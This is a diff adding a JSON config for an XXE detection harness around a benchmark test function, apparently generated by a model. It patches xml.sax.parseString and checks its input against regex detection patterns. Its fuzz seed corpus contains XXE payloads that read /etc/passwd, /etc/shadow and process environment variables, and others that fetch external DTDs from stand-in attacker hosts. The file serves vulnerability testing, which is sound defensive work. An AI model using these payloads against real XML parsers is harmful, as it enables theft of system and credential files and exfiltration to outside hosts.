@@ -1,0 +1,49 @@
+{
+  "monitor": {
+    "strategy": "patch_call",
+    "patch_target": "xml.sax.parseString",
+    "target_arg_index": 0,
+    "target_arg_name": null,
+    "capture_what": "The XML string argument passed to xml.sax.parseString, checked for external entity declarations",
+    "additional_imports": [
+      "xml.sax"
+    ]
+  },
+  "oracle_check": {
+    "condition_description": "The XML string passed to the parser contains a DOCTYPE declaration with an external entity SYSTEM reference, indicating an XXE payload is being parsed with external entities enabled",
+    "trigger_patterns": [
+      "<!DOCTYPE[^>]*\\[",
+      "<!ENTITY[^>]+SYSTEM\\s+['\"]",
+      "<!ENTITY[^>]+PUBLIC\\s+['\"]",
+      "SYSTEM\\s+['\"](?:file://|http://|https://|ftp://|php://|expect://)",
+      "<!\\[CDATA\\[.*\\]\\]>"
+    ],
+    "raise_type": "RuntimeError",
+    "raise_message_template": "PY/XXE: XML external entity injection detected — external entities enabled and malicious DOCTYPE/ENTITY reached the parser — captured={captured} pattern={matched_pattern}"
+  },
+  "fuzz_guidance": {
+    "seed_corpus": [
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/evil\">]><root>&xxe;</root>",
+      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [<!ENTITY ext SYSTEM \"file:///etc/shadow\">]><test>&ext;</test>",
+      "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///proc/self/environ\">]><data>&file;</data>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo PUBLIC \"-//OWASP//DTD//EN\" \"http://evil.com/evil.dtd\"><foo/>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]><foo/>"
+    ],
+    "skip_condition": "False"
+  },
+  "_meta": {
+    "function": "BenchmarkTest00540_post",
+    "file": "testcode/BenchmarkTest00540.py",
+    "input_strategy": "flask_view",
+    "function_signature": "def BenchmarkTest00540_post(self)",
+    "tainted_params": [
+      {
+        "name": "param",
+        "index": -1,
+        "type": "str"
+      }
+    ],
+    "model": "anthropic/claude-sonnet-4-6"
+  }
+}
